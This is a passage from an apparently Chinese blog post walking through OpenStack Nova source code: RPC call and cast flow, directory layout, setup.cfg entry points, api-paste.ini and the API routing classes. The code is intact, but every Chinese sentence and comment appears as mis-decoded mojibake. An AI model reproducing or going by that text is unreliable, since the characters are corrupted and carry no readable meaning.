title="rpc.call"></a>rpc.call</h2><ol><li><p>å®ä¾‹åŒ–ä¸»é¢˜å‘å¸ƒè€…ï¼Œå°†è¯·æ±‚å‘é€åˆ°æ¶ˆæ¯é˜Ÿåˆ—ï¼›åœ¨å‘å¸ƒæ“ä½œä¹‹å‰ï¼Œå®ä¾‹åŒ–ç›´è¿æ¶ˆè´¹è€…ç­‰å¾…å“åº”ä¿¡æ¯</p></li><li><p>ä¸€æ—¦æ¶ˆæ¯è¢«äº¤æ¢å™¨åˆ†æ´¾ï¼ˆdispatchï¼‰ï¼Œå®ƒå°±ä¼šè¢«è·¯ç”±é”®ï¼ˆä¾‹å¦‚ï¼Œ<code>topic.host</code>ï¼‰æŒ‡å®šçš„ä¸»é¢˜æ¶ˆè´¹è€…è·å–ï¼Œå¹¶ä¼ é€’ç»™è´Ÿè´£è¯¥ä»»åŠ¡çš„å·¥ä½œè€…</p></li><li><p>ä»»åŠ¡å®Œæˆåï¼Œå°†åˆ†é…ä¸€ä¸ªç›´è¿å‘å¸ƒè€…å°†å“åº”æ¶ˆæ¯å‘é€åˆ°æ¶ˆæ¯é˜Ÿåˆ—</p></li><li><p>ä¸€æ—¦æ¶ˆæ¯è¢«äº¤æ¢å™¨åˆ†æ´¾ï¼Œå®ƒå°±ä¼šè¢«è·¯ç”±é”®ï¼ˆä¾‹å¦‚ï¼Œ<code>msg_id</code>ï¼‰æŒ‡å®šçš„ç›´è¿æ¶ˆè´¹è€…è·å–ï¼Œå¹¶ä¼ é€’ç»™è°ƒç”¨è€…</p></li></ol><img src="https://i.loli.net/2021/06/06/ApK1vCySXhQE3mW.png"><h2 id="rpc-cast"><a href="#rpc-cast" class="headerlink" title="rpc.cast"></a>rpc.cast</h2><ol><li><p> å®ä¾‹åŒ–ä¸»é¢˜å‘å¸ƒè€…ï¼Œå°†è¯·æ±‚å‘é€åˆ°æ¶ˆæ¯é˜Ÿåˆ—</p></li><li><p> ä¸€æ—¦æ¶ˆæ¯è¢«äº¤æ¢å™¨åˆ†æ´¾ï¼ˆdispatchï¼‰ï¼Œå®ƒå°±ä¼šè¢«è·¯ç”±é”®ï¼ˆä¾‹å¦‚ï¼Œ<code>topic</code>ï¼‰æŒ‡å®šçš„ä¸»é¢˜æ¶ˆè´¹è€…è·å–ï¼Œå¹¶ä¼ é€’ç»™è´Ÿè´£è¯¥ä»»åŠ¡çš„å·¥ä½œè€…</p></li></ol><img src="https://i.loli.net/2021/06/06/3nUaoMlKdHg9BQv.png"><h1 id="æºç åˆ†æ"><a href="#æºç åˆ†æ" class="headerlink" title="æºç åˆ†æ"></a>æºç åˆ†æ</h1><p>ä» github ä¸‹è½½ Victoria ç‰ˆæœ¬çš„ Nova æºç </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/openstack/nova.git --branch stable/victoria --single-branch</span><br></pre></td></tr></table></figure><p>nova/ æ–‡ä»¶å¤¹ä¸‹çš„ç›®å½•</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">accelerator/    <span class="comment"># Cyborg åŠ é€Ÿå™¨</span></span><br><span class="line">api/            <span class="comment"># Nova API æœåŠ¡</span></span><br><span class="line">cmd/            <span class="comment"># å„ä¸ª Nova æœåŠ¡çš„å…¥å£ç¨‹åº</span></span><br><span class="line">compute/        <span class="comment"># Nova Compute æœåŠ¡</span></span><br><span class="line">conductor/      <span class="comment"># Nova Conductor æœåŠ¡</span></span><br><span class="line">conf/           <span class="comment"># æ‰€æœ‰çš„é…ç½®é€‰é¡¹</span></span><br><span class="line">console/        <span class="comment"># nova-console æœåŠ¡</span></span><br><span class="line">db/             <span class="comment"># å°è£…æ•°æ®åº“æ“ä½œ</span></span><br><span class="line">hacking/        <span class="comment"># ç¼–ç è§„èŒƒæ£€æŸ¥</span></span><br><span class="line">image/          <span class="comment"># å°è£…é•œåƒæ“ä½œï¼ŒGlance æ¥å£æŠ½è±¡</span></span><br><span class="line">keymgr/         <span class="comment"># å¯†é’¥ç®¡ç†å™¨å®ç°</span></span><br><span class="line">locale/         <span class="comment"># å›½é™…åŒ–ç›¸å…³æ–‡ä»¶</span></span><br><span class="line">network/        <span class="comment"># nova-network æœåŠ¡</span></span><br><span class="line">notifications/  <span class="comment"># é€šçŸ¥ç›¸å…³åŠŸèƒ½</span></span><br><span class="line">objects/        <span class="comment"># å°è£…å®ä½“å¯¹è±¡çš„ CURD æ“ä½œ</span></span><br><span class="line">pci/            <span class="comment"># PCI/SR-IOV æ”¯æŒ</span></span><br><span class="line">policies/       <span class="comment"># æ‰€æœ‰ Policy çš„é»˜è®¤è§„åˆ™</span></span><br><span class="line">privsep/        <span class="comment"># oslo_privsep ç›¸å…³</span></span><br><span class="line">scheduler/      <span class="comment"># Nova Scheduler æœåŠ¡</span></span><br><span class="line">servicegroup/   <span class="comment"># æˆå‘˜æœåŠ¡ï¼ˆmembershipï¼‰ï¼ŒæœåŠ¡ç»„</span></span><br><span class="line">storage/        <span class="comment"># Ceph å­˜å‚¨æ”¯æŒ</span></span><br><span class="line">tests/          <span class="comment"># å•å…ƒæµ‹è¯•</span></span><br><span class="line">virt/           <span class="comment"># æ”¯æŒçš„ hypervisor é©±åŠ¨</span></span><br><span class="line">volume/         <span class="comment"># å°è£…å·è®¿é—®æ¥å£ï¼ŒCinder æ¥å£æŠ½è±¡</span></span><br></pre></td></tr></table></figure><p>nova/ æ–‡ä»¶å¤¹ä¸‹çš„ python æ–‡ä»¶</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">__init__.py</span><br><span class="line">availability_zones.py   <span class="comment"># åŒºåŸŸè®¾ç½®çš„å·¥å…·å‡½æ•°</span></span><br><span class="line">baserpc.py              <span class="comment"># åŸºç¡€ RPC å®¢æˆ·ç«¯/æœåŠ¡ç«¯å®ç°</span></span><br><span class="line">block_device.py         <span class="comment"># å—è®¾å¤‡æ˜ å°„</span></span><br><span class="line">cache_utils.py          <span class="comment"># oslo_cache å°è£…</span></span><br><span class="line">config.py               <span class="comment"># è§£æå‘½ä»¤è¡Œå‚æ•°</span></span><br><span class="line">context.py              <span class="comment"># è´¯ç©¿ Nova çš„æ‰€æœ‰è¯·æ±‚çš„ä¸Šä¸‹æ–‡</span></span><br><span class="line">crypto.py               <span class="comment"># åŒ…è£…æ ‡å‡†åŠ å¯†æ•°æ®å…ƒç´ </span></span><br><span class="line">debugger.py             <span class="comment"># pydev è°ƒè¯•</span></span><br><span class="line">exception.py            <span class="comment"># åŸºç¡€å¼‚å¸¸ç±»</span></span><br><span class="line">exception_wrapper.py    <span class="comment"># å°è£…å¼‚å¸¸ç±»</span></span><br><span class="line">filters.py              <span class="comment"># åŸºç¡€è¿‡æ»¤å™¨</span></span><br><span class="line">i18n.py                 <span class="comment"># é›†æˆ oslo_i18n</span></span><br><span class="line">loadables.py            <span class="comment"># å¯åŠ è½½ç±»</span></span><br><span class="line">manager.py              <span class="comment"># åŸºç¡€ Manager ç±»</span></span><br><span class="line">middleware.py           <span class="comment"># æ›´æ–° oslo_middleware çš„é»˜è®¤é…ç½®é€‰é¡¹</span></span><br><span class="line">monkey_patch.py         <span class="comment"># eventlet çŒ´å­è¡¥ä¸</span></span><br><span class="line">policy.py               <span class="comment"># ç­–ç•¥å¼•æ“</span></span><br><span class="line">profiler.py             <span class="comment"># è°ƒç”¨ OSProfiler</span></span><br><span class="line">quota.py                <span class="comment"># æ¯ä¸ªé¡¹ç›®çš„èµ„æºé…é¢</span></span><br><span class="line">rpc.py                  <span class="comment"># RPC æ“ä½œç›¸å…³çš„å·¥å…·å‡½æ•°</span></span><br><span class="line">safe_utils.py           <span class="comment"># ä¸ä¼šå¯¼è‡´å¾ªç¯å¯¼å…¥çš„å·¥å…·å‡½æ•°</span></span><br><span class="line">service.py              <span class="comment"># é€šç”¨èŠ‚ç‚¹åŸºç±»ï¼Œç”¨äºåœ¨ä¸»æœºä¸Šè¿è¡Œçš„æ‰€æœ‰å·¥ä½œè€…</span></span><br><span class="line">service_auth.py         <span class="comment"># èº«ä»½è®¤è¯æ’ä»¶</span></span><br><span class="line">test.py                 <span class="comment"># å•å…ƒæµ‹è¯•åŸºç¡€ç±»</span></span><br><span class="line">utils.py                <span class="comment"># å·¥å…·å‡½æ•°</span></span><br><span class="line">version.py              <span class="comment"># ç‰ˆæœ¬å·ç®¡ç†</span></span><br><span class="line">weights.py              <span class="comment"># æƒé‡æ’ä»¶</span></span><br><span class="line">wsgi.py                 <span class="comment"># ç®¡ç† WSGI åº”ç”¨çš„æœåŠ¡å™¨ç±»</span></span><br></pre></td></tr></table></figure><p>setup.cfg é…ç½®æ–‡ä»¶ï¼Œ<code>[entry_points]</code> å°èŠ‚æŒ‡å®šäº† nova å„ä¸ªç»„ä»¶å…¥å£</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">console_scripts &#x3D;</span><br><span class="line">    nova-api &#x3D; nova.cmd.api:main</span><br><span class="line">    nova-api-metadata &#x3D; nova.cmd.api_metadata:main</span><br><span class="line">    nova-api-os-compute &#x3D; nova.cmd.api_os_compute:main</span><br><span class="line">    nova-compute &#x3D; nova.cmd.compute:main</span><br><span class="line">    nova-conductor &#x3D; nova.cmd.conductor:main</span><br><span class="line">    nova-manage &#x3D; nova.cmd.manage:main</span><br><span class="line">    nova-novncproxy &#x3D; nova.cmd.novncproxy:main</span><br><span class="line">    nova-policy &#x3D; nova.cmd.policy:main</span><br><span class="line">    nova-rootwrap &#x3D; oslo_rootwrap.cmd:main</span><br><span class="line">    nova-rootwrap-daemon &#x3D; oslo_rootwrap.cmd:daemon</span><br><span class="line">    nova-scheduler &#x3D; nova.cmd.scheduler:main</span><br><span class="line">    nova-serialproxy &#x3D; nova.cmd.serialproxy:main</span><br><span class="line">    nova-spicehtml5proxy &#x3D; nova.cmd.spicehtml5proxy:main</span><br><span class="line">    nova-status &#x3D; nova.cmd.status:main</span><br><span class="line">wsgi_scripts &#x3D;</span><br><span class="line">    nova-api-wsgi &#x3D; nova.api.openstack.compute.wsgi:init_application</span><br><span class="line">    nova-metadata-wsgi &#x3D; nova.api.metadata.wsgi:init_application</span><br></pre></td></tr></table></figure><h2 id="nova-api"><a href="#nova-api" class="headerlink" title="nova-api"></a>nova-api</h2><p>nova-api å¯¹å¤–æä¾› RESTful APIï¼Œæ²¡æœ‰å¯¹å†…çš„ RPC ã€‚</p><p>nova/api/ ç›®å½•ç»“æ„</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">__init__.py</span><br><span class="line">auth.py             <span class="comment"># èº«ä»½è®¤è¯ä¸­é—´ä»¶</span></span><br><span class="line">compute_req_id.py   <span class="comment"># x-compute-request-id ä¸­é—´ä»¶ï¼ˆoslo_middlewareï¼‰</span></span><br><span class="line">metadata/           <span class="comment"># Metadata API</span></span><br><span class="line">openstack/          <span class="comment"># Nova v2.1 API</span></span><br><span class="line">validation/         <span class="comment"># è¯·æ±‚ä½“éªŒè¯</span></span><br><span class="line">wsgi.py             <span class="comment"># WSGI åŸè¯­ï¼ˆè¯·æ±‚ã€åº”ç”¨ã€ä¸­é—´ä»¶ã€è·¯ç”±ã€åŠ è½½å™¨ï¼‰</span></span><br></pre></td></tr></table></figure><p>openstack ç›®å½•ä¸­åŒ…å« WSGI åŸºç¡€æ¶æ„çš„ä»£ç ï¼Œä¸€äº› WSGI ä¸­é—´ä»¶ï¼Œä»¥åŠå¦‚ä½•è§£æè¯·æ±‚ä¸åˆ†å‘è¯·æ±‚çš„æ ¸å¿ƒä»£ç ã€‚</p><p>nova/api/openstack/compute/ åŒ…å« Controller å®ç°ï¼ŒResource å¯¹è±¡å°† API æ˜ å°„åˆ°ç›¸åº”çš„ Controller æ–¹æ³•ä¸Šã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">__init__.py</span><br><span class="line">api_version_request.py  <span class="comment"># ç‰ˆæœ¬éªŒè¯</span></span><br><span class="line">auth.py                 <span class="comment"># noauth ä¸­é—´ä»¶</span></span><br><span class="line">common.py               <span class="comment"># ä¿¡æ¯æŸ¥è¯¢çš„å·¥å…·å‡½æ•°</span></span><br><span class="line">compute/                <span class="comment"># æ¯ä¸ª API çš„å…¥å£ç‚¹</span></span><br><span class="line">identity.py             <span class="comment"># éªŒè¯é¡¹ç›®æ˜¯å¦å­˜åœ¨</span></span><br><span class="line">requestlog.py           <span class="comment"># è¯·æ±‚æ—¥å¿—ä¸­é—´ä»¶</span></span><br><span class="line">urlmap.py               <span class="comment"># url æ˜ å°„</span></span><br><span class="line">versioned_method.py     <span class="comment"># ç‰ˆæœ¬ä¿¡æ¯</span></span><br><span class="line">wsgi.py                 <span class="comment"># WSGI ç›¸å…³æŠ½è±¡ç±»</span></span><br><span class="line">wsgi_app.py             <span class="comment"># WSGI åº”ç”¨ç¨‹åºåˆå§‹åŒ–æ–¹æ³•</span></span><br></pre></td></tr></table></figure><h3 id="API-è¯·æ±‚è·¯ç”±"><a href="#API-è¯·æ±‚è·¯ç”±" class="headerlink" title="API è¯·æ±‚è·¯ç”±"></a>API è¯·æ±‚è·¯ç”±</h3><p>nova-api è¯»å– etc/nova/api-paste.ini å¹¶åŠ è½½ WSGI ç¨‹åºï¼Œæœ€ç»ˆ API å…¥å£ç‚¹éƒ½ä½äº nova.api.openstack.compute ä¸­</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[composite:osapi_compute]</span></span><br><span class="line"><span class="attr">use</span> = call:nova.api.openstack.urlmap:urlmap_factory</span><br><span class="line">/: oscomputeversions                # version API</span><br><span class="line">/v2: oscomputeversion_legacy_v2     # v2 API</span><br><span class="line">/v2.1: oscomputeversion_v2          # v2.1 API</span><br><span class="line"><span class="comment"># v21 is an exactly feature match for v2, except it has more stringent</span></span><br><span class="line"><span class="comment"># input validation on the wsgi surface (prevents fuzzing early on the</span></span><br><span class="line"><span class="comment"># API). It also provides new features via API microversions which are</span></span><br><span class="line"><span class="comment"># opt into for clients. Unaware clients will receive the same frozen</span></span><br><span class="line"><span class="comment"># v2 API feature set, but with some relaxed validation</span></span><br><span class="line">/v2/+: openstack_compute_api_v21_legacy_v2_compatible</span><br><span class="line">/v2.1/+: openstack_compute_api_v21</span><br><span class="line"></span><br><span class="line"><span class="section">[composite:openstack_compute_api_v21]</span></span><br><span class="line"><span class="attr">use</span> = call:nova.api.auth:pipeline_factory_v21       <span class="comment"># åŠ è½½ä¸­é—´ä»¶</span></span><br><span class="line"><span class="attr">keystone</span> = cors http_proxy_to_wsgi compute_req_id faultwrap request_log sizelimit osprofiler bees_profiler authtoken keystonecontext osapi_compute_app_v21</span><br><span class="line"><span class="comment"># DEPRECATED: The [api]auth_strategy conf option is deprecated and will be</span></span><br><span class="line"><span class="comment"># removed in a subsequent release, whereupon this pipeline will be unreachable.</span></span><br><span class="line"><span class="attr">noauth2</span> = cors http_proxy_to_wsgi compute_req_id faultwrap request_log sizelimit osprofiler bees_profiler noauth2 osapi_compute_app_v21</span><br><span class="line"></span><br><span class="line"><span class="section">[app:osapi_compute_app_v21]</span></span><br><span class="line"><span class="attr">paste.app_factory</span> = nova.api.openstack.compute:APIRouterV21.factory  <span class="comment"># å…¥å£</span></span><br></pre></td></tr></table></figure><p>nova/api/openstack/compute/routes.py ä¸­çš„ APIRouterV21 ä¸»è¦ç”¨æ¥å®Œæˆè·¯ç”±è§„åˆ™çš„åˆ›å»ºï¼Œå…¶ä¸­ ROUTE_LIST ä¿å­˜äº† URL ä¸ Controller ä¹‹é—´çš„æ˜ å°„å…³ç³»ã€‚</p><p>APIRouterV21 åŸºäº ROUTE_LISTï¼Œä½¿ç”¨ Routes æ¨¡å—ä½œä¸º URL æ˜ å°„çš„å·¥å…·ï¼Œå°†å„ä¸ªæ¨¡å—æ‰€å®ç°çš„ API å¯¹åº”çš„ URL æ³¨å†Œåˆ° mapper ä¸­ï¼Œå¹¶æŠŠæ¯ä¸ªèµ„æºéƒ½å°è£…æˆ nova.api.openstack.wsgi.Resource å¯¹è±¡ï¼Œå½“è§£æ URL è¯·æ±‚æ—¶ï¼Œå¯ä»¥é€šè¿‡ URL æ˜ å°„æ‰¾åˆ° API å¯¹åº”çš„ Resource å¯¹è±¡ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Router ç±»å¯¹ WSGI routes æ¨¡å—è¿›è¡Œäº†ç®€å•çš„å°è£…</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">APIRouterV21</span>(<span class="params">base_wsgi.Router</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;Routes requests on the OpenStack API to the appropriate controller</span></span><br><span class="line"><span class="string">    and method. The URL mapping based on the plain list `ROUTE_LIST` is built</span></span><br><span class="line"><span class="string">    at here.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, custom_routes=<span class="literal">None</span></span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;:param custom_routes: the additional routes can be added by this</span></span><br><span class="line"><span class="string">               parameter. This parameter is used to test on some fake routes</span></span><br><span class="line"><span class="string">               primarily.</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="built_in">super</span>(APIRouterV21, self).__init__(nova.api.openstack.ProjectMapper())</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> custom_routes <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            custom_routes = <span class="built_in">tuple</span>()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> path, methods <span class="keyword">in</span> ROUTE_LIST + custom_routes:</span><br><span class="line">            <span class="comment"># NOTE(alex_xu): The variable &#x27;methods&#x27; is a dict in normal, since</span></span><br><span class="line">            <span class="comment"># the dict includes all the methods supported in the path. But</span></span><br><span class="line">            <span class="comment"># if the variable &#x27;method&#x27; is a string, it means a redirection.</span></span><br><span class="line">            <span class="comment"># For example, the request to the &#x27;&#x27; will be redirect to the &#x27;/&#x27; in</span></span><br><span class="line">            <span class="comment"># the Nova API. To indicate that, using the target path instead of</span></span><br><span class="line">            <span class="comment"># a dict. The route entry just writes as &quot;(&#x27;&#x27;, &#x27;/)&quot;.</span></span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">isinstance</span>(methods, six.string_types):</span><br><span class="line">                self.<span class="built_in">map</span>.redirect(path, methods)</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> method, controller_info <span class="keyword">in</span> methods.items():</span><br><span class="line">                <span class="comment"># TODO(alex_xu): In the end, I want to create single controller</span></span><br><span class="line">                <span class="comment"># instance instead of create controller instance for each</span></span><br><span class="line">                <span class="comment"># route.</span></span><br><span class="line">                controller = controller_info[<span class="number">0</span>]()</span><br><span class="line">                action = controller_info[<span class="number">1</span>]</span><br><span class="line">                self.<span class="built_in">map</span>.create_route(path, method, controller, action)</span><br><span class="line"></span><br><span class="line"><span class="meta">    @classmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">factory</span>(<span class="params">cls, global_config, **local_config</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;Simple paste factory, :class:`nova.wsgi.Router` doesn&#x27;t have one.&quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">return</span> cls()</span><br></pre></td></tr></table></figure><p>nova/api/wsgi.py è§£æ URL æ˜ å°„ï¼Œé€šè¿‡ _dispatch å›è°ƒï¼Œè°ƒç”¨ Resource å¯¹è±¡çš„ __call__ æ–¹æ³•ï¼Œæœ€ç»ˆé€šè¿‡è¯·æ±‚è°ƒç”¨ API å¯¹åº”çš„æ¨¡å—ä¸­çš„æ–¹æ³•ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># è·¯ç”±</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Router</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;WSGI middleware that maps incoming requests to WSGI apps.&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, mapper</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;Create a router for the given routes.Mapper.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        Each route in `mapper` must specify a &#x27;controller&#x27;, which is a</span></span><br><span class="line"><span class="string">        WSGI app to call.  You&#x27;ll probably want to specify an &#x27;action&#x27; as</span></span><br><span class="line"><span class="string">        well and have your controller be an object that can route</span></span><br><span class="line"><span class="string">        the request to the action-specific method.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        Examples:</span></span><br><span class="line"><span class="string">          mapper = routes.Mapper()</span></span><br><span class="line"><span class="string">          sc = ServerController()</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">          # Explicit mapping of one route to a controller+action</span></span><br><span class="line"><span class="string">          mapper.connect(None, &#x27;/svrlist&#x27;, controller=sc, action=&#x27;list&#x27;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">          # Actions are all implicitly defined</span></span><br><span class="line"><span class="string">          mapper.resource(&#x27;server&#x27;, &#x27;servers&#x27;, controller=sc)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">          # Pointing to an arbitrary WSGI app.  You can specify the</span></span><br><span class="line"><span class="string">          # &#123;path_info:.*&#125; parameter so the target app can be handed just that</span></span><br><span class="line"><span class="string">          # section of the URL.</span></span><br><span class="line"><span class="string">          mapper.connect(None, &#x27;/v1.0/&#123;path_info:.*&#125;&#x27;, controller=BlogApp())</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        self.<span class="built_in">map</span> = mapper</span><br><span class="line">        <span class="comment"># ä½¿ç”¨ routes æ¨¡å—å…³è” mapper å’Œ _dispatch</span></span><br><span class="line">        <span class="comment"># routes.middleware.RoutesMiddleware è®¾ç½® environ ä¿¡æ¯</span></span><br><span class="line">        self._router = routes.middleware.RoutesMiddleware(self._dispatch,</span><br><span class="line">                                                          self.<span class="built_in">map</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">    @webob.dec.wsgify(<span class="params">RequestClass=Request</span>)</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__call__</span>(<span class="params">self, req</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;Route the incoming request to a controller based on self.map.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        If no match, return a 404.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="comment"># æ ¹æ® mapper å°†è¯·æ±‚è·¯ç”±åˆ° WSGI åº”ç”¨ï¼ˆèµ„æºï¼‰</span></span><br><span class="line">        <span class="comment"># æ¯ä¸ªèµ„æºä¼šåœ¨ __call__ æ–¹æ³•ä¸­æ ¹æ® HTTP è¯·æ±‚çš„ URL è·¯ç”±åˆ°å¯¹åº” Controller ä¸Šçš„æ–¹æ³•ï¼ˆActionï¼‰</span></span><br><span class="line">        <span class="keyword">return</span> self._router</span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line"><span class="meta">    @webob.dec.wsgify(<span class="params">RequestClass=Request</span>)</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_dispatch</span>(<span class="params">req</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;Dispatch the request to the appropriate controller.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        Called by self._router after matching the incoming request to a route</span></span><br><span class="line"><span class="string">        and putting the information into req.environ.  Either returns 404</span></span><br><span class="line"><span class="string">        or the routed WSGI app&#x27;s response.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="comment"># æ ¹æ® HTTP è¯·æ±‚çš„ environ ä¿¡æ¯æ‰¾åˆ° URL å¯¹åº”çš„ Controller</span></span><br><span class="line">        match = req.environ[<span class="string">&#x27;wsgiorg.routing_args&#x27;</span>][<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> match:</span><br><span class="line">            <span class="keyword">return</span> webob.exc.HTTPNotFound()</span><br><span class="line">        app = match[<span class="string">&#x27;controller&#x27;</span>]</span><br><span class="line">        <span class="keyword">return</span> app</span><br></pre></td></tr></table></figure><h3 id="API-å®ç°"><a href="#API-å®ç°" class="headerlink" title="API å®ç°"></a>API å®ç°</h3><p>nova/api/openstack/compute/ 